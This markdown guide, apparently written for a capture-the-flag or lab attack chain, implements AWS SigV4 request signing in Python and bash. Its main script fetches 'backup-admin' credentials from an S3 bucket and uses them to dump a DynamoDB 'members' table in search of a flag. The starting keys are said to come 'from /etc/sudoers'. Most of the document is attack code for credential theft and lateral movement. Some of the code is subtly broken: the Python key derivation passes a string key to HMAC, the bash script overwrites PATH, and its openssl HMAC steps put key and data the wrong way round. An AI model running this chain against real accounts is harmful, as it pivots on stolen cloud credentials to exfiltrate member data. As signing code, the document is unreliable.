# AWS SigV4 Request Signing - Implementation Guide

**Purpose**: Execute authenticated AWS API calls using manually retrieved credentials  
**Status**: Required for Stage 4 AWS API chain

---

## Prerequisites

```
AWS_ACCESS_KEY_ID: (from /etc/sudoers)
AWS_SECRET_ACCESS_KEY: (from /etc/sudoers)
AWS_REGION: us-east-1 (assumed)
REQUEST_HOST: s3.us-east-1.amazonaws.com or dynamodb.us-east-1.amazonaws.com
```

---

## SigV4 Signing Process

### Step 1: Create Canonical Request

```
<HTTPMethod>\n
<CanonicalURI>\n
<CanonicalQueryString>\n
<CanonicalHeaders>\n
<SignedHeaders>\n
<HashedPayload>
```

### Example for S3 GetObject

```
GET
/backup-admin/backup-credentials.json
(empty)
host:s3.us-east-1.amazonaws.com
x-amz-date:20260820T120000Z

host;x-amz-date
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

### Step 2: Create String to Sign

```
AWS4-HMAC-SHA256\n
<ISO8601DateTime>\n
<DateStamp>/<Region>/s3/aws4_request\n
<Sha256(CanonicalRequest)>
```

### Step 3: Calculate Signature

```python
def sign(key, msg):
    return hmac.new(key, msg.encode(), hashlib.sha256).digest()

kDate = sign(("AWS4" + secretKey).encode(), dateStamp)
kRegion = sign(kDate, region)
kService = sign(kRegion, service)
kSigning = sign(kService, "aws4_request")
signature = hmac.new(kSigning, stringToSign, hashlib.sha256).hexdigest()
```

### Step 4: Add Authorization Header

```
Authorization: AWS4-HMAC-SHA256 Credential=<AccessKey>/<Date>/<Region>/<Service>/aws4_request, SignedHeaders=host;x-amz-date, Signature=<Signature>
```

---

## Complete Python Implementation

```python
#!/usr/bin/env python3

import hashlib
import hmac
import datetime
import requests
import json

# Configuration
ACCESS_KEY = "YOUR_AWS_ACCESS_KEY_ID"
SECRET_KEY = "YOUR_AWS_SECRET_ACCESS_KEY"
REGION = "us-east-1"
SERVICE = "s3"  # or "dynamodb"

def sign(key, msg):
    """Sign message using HMAC-SHA256"""
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def get_signature_key(secret_key, date_stamp, region, service):
    """Derive the signing key"""
    kDate = sign(("AWS4" + secret_key), date_stamp)
    kRegion = sign(kDate, region)
    kService = sign(kRegion, service)
    kSigning = sign(kService, "aws4_request")
    return kSigning

def create_canonical_request(method, canonical_uri, canonical_querystring, 
                             canonical_headers, signed_headers, payload_hash):
    """Create canonical request string"""
    canonical_request = (
        method + '\n' +
        canonical_uri + '\n' +
        canonical_querystring + '\n' +
        canonical_headers + '\n' +
        signed_headers + '\n' +
        payload_hash
    )
    return canonical_request

def sign_request(method, host, path, region, service, access_key, secret_key, 
                payload=None):
    """Sign an AWS request"""
    
    # Timestamp
    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')
    
    # Payload hash
    if payload is None:
        payload = ""
    payload_hash = hashlib.sha256(payload.encode()).hexdigest()
    
    # Canonical request
    canonical_uri = path
    canonical_querystring = ""
    canonical_headers = (
        f"host:{host}\n"
        f"x-amz-date:{amz_date}\n"
    )
    signed_headers = "host;x-amz-date"
    
    canonical_request = create_canonical_request(
        method, canonical_uri, canonical_querystring,
        canonical_headers, signed_headers, payload_hash
    )
    
    # String to sign
    canonical_request_hash = hashlib.sha256(
        canonical_request.encode()
    ).hexdigest()
    
    credential_scope = (
        f"{date_stamp}/{region}/{service}/aws4_request"
    )
    
    string_to_sign = (
        "AWS4-HMAC-SHA256\n" +
        amz_date + "\n" +
        credential_scope + "\n" +
        canonical_request_hash
    )
    
    # Signature
    signing_key = get_signature_key(secret_key, date_stamp, region, service)
    signature = hmac.new(
        signing_key,
        string_to_sign.encode(),
        hashlib.sha256
    ).hexdigest()
    
    # Authorization header
    auth_header = (
        f"AWS4-HMAC-SHA256 Credential={access_key}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, Signature={signature}"
    )
    
    return {
        "Authorization": auth_header,
        "x-amz-date": amz_date,
        "Host": host
    }

# Example: S3 GetObject
def get_s3_object(bucket, key, access_key, secret_key):
    """Retrieve object from S3"""
    host = f"s3.{REGION}.amazonaws.com"
    path = f"/{bucket}/{key}"
    
    headers = sign_request(
        "GET", host, path, REGION, "s3",
        access_key, secret_key
    )
    
    url = f"https://{host}{path}"
    response = requests.get(url, headers=headers)
    return response

# Example: DynamoDB Scan
def dynamodb_scan(table_name, access_key, secret_key):
    """Scan DynamoDB table"""
    host = f"dynamodb.{REGION}.amazonaws.com"
    
    payload = json.dumps({"TableName": table_name})
    
    headers = sign_request(
        "POST", host, "/", REGION, "dynamodb",
        access_key, secret_key, payload
    )
    headers.update({
        "X-Amz-Target": "DynamoDB_20120810.Scan",
        "Content-Type": "application/x-amz-json-1.0"
    })
    
    url = f"https://{host}/"
    response = requests.post(url, headers=headers, data=payload)
    return response

# Main execution
if __name__ == "__main__":
    # Step 1: Get S3 credentials
    print("[*] Retrieving S3 backup-credentials.json...")
    s3_response = get_s3_object(
        "backup-bucket",
        "backup-admin/backup-credentials.json",
        ACCESS_KEY,
        SECRET_KEY
    )
    
    if s3_response.status_code == 200:
        backup_creds = s3_response.json()
        backup_key = backup_creds["access_key_id"]
        backup_secret = backup_creds["secret_access_key"]
        print(f"[+] Got backup-admin credentials")
    else:
        print(f"[-] S3 request failed: {s3_response.status_code}")
        exit(1)
    
    # Step 2: Query DynamoDB with backup-admin credentials
    print("[*] Scanning DynamoDB members table...")
    db_response = dynamodb_scan(
        "members",
        backup_key,
        backup_secret
    )
    
    if db_response.status_code == 200:
        members = db_response.json()
        print(f"[+] Retrieved {len(members.get('Items', []))} records")
        
        # Find flag
        for item in members.get("Items", []):
            if item.get("id", {}).get("S") == "SSM-FLAG":
                flag = item.get("flag", {}).get("S")
                print(f"\n[+] FLAG: {flag}")
    else:
        print(f"[-] DynamoDB request failed: {db_response.status_code}")
        exit(1)
```

---

## Command-Line Alternative (curl + bash)

```bash
#!/bin/bash

ACCESS_KEY="YOUR_KEY"
SECRET_KEY="YOUR_SECRET"
REGION="us-east-1"
SERVICE="s3"
BUCKET="backup-bucket"
OBJECT="backup-admin/backup-credentials.json"

HOST="s3.${REGION}.amazonaws.com"
PATH="/${BUCKET}/${OBJECT}"

# Date
DATE_STAMP=$(date -u +%Y%m%d)
AMZ_DATE=$(date -u +%Y%m%dT%H%M%SZ)

# Create canonical request
PAYLOAD_HASH=$(echo -n "" | sha256sum | awk '{print $1}')

CANONICAL_REQUEST="GET
${PATH}

host:${HOST}
x-amz-date:${AMZ_DATE}

host;x-amz-date
${PAYLOAD_HASH}"

# Create string to sign
CANONICAL_HASH=$(echo -n "${CANONICAL_REQUEST}" | sha256sum | awk '{print $1}')

CREDENTIAL_SCOPE="${DATE_STAMP}/${REGION}/${SERVICE}/aws4_request"

STRING_TO_SIGN="AWS4-HMAC-SHA256
${AMZ_DATE}
${CREDENTIAL_SCOPE}
${CANONICAL_HASH}"

# Calculate signature
SIGNING_KEY=$(echo -n "AWS4${SECRET_KEY}" | openssl dgst -sha256 -hmac "${DATE_STAMP}" -binary)
SIGNING_KEY=$(echo -n "${REGION}" | openssl dgst -sha256 -hmac "${SIGNING_KEY}" -binary)
SIGNING_KEY=$(echo -n "${SERVICE}" | openssl dgst -sha256 -hmac "${SIGNING_KEY}" -binary)
SIGNING_KEY=$(echo -n "aws4_request" | openssl dgst -sha256 -hmac "${SIGNING_KEY}" -binary)

SIGNATURE=$(echo -n "${STRING_TO_SIGN}" | openssl dgst -sha256 -hmac "${SIGNING_KEY}" -hex | awk '{print $2}')

# Authorization header
AUTH_HEADER="AWS4-HMAC-SHA256 Credential=${ACCESS_KEY}/${CREDENTIAL_SCOPE}, SignedHeaders=host;x-amz-date, Signature=${SIGNATURE}"

# Make request
curl -X GET \
  -H "Host: ${HOST}" \
  -H "x-amz-date: ${AMZ_DATE}" \
  -H "Authorization: ${AUTH_HEADER}" \
  "https://${HOST}${PATH}"
```

---

## Debugging

### Common Issues

1. **Invalid Signature**
   - Check date format (UTC only)
   - Verify payload hash (empty string = specific hash)
   - Ensure proper line breaks in canonical request

2. **Access Denied**
   - Verify credentials are correct
   - Check IAM role permissions
   - Ensure region matches

3. **Malformed Request**
   - Headers must be in specific order
   - SignedHeaders must match canonical headers
   - No extra whitespace in values

---

## References

- [AWS SigV4 Signing Process](https://docs.aws.amazon.com/general/latest/gr/sigv4_signing.html)
- [S3 GetObject API](https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetObject.html)
- [DynamoDB Scan API](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Scan.html)

---

**Status**: Implementation ready  
**Last Updated**: 2026-08-20
